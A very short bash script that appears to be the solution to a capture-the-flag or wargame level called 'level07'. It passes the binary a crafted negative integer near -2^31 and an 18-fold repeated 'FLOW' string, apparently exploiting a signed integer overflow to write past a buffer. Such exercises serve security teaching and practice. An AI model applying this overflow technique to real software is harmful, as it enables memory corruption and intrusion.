#!/bin/bash

../src/level07 $(echo "(-2^31)+(72/4)"|bc) $(python -c 'print "\x46\x4c\x4f\x57" * (72/4)')
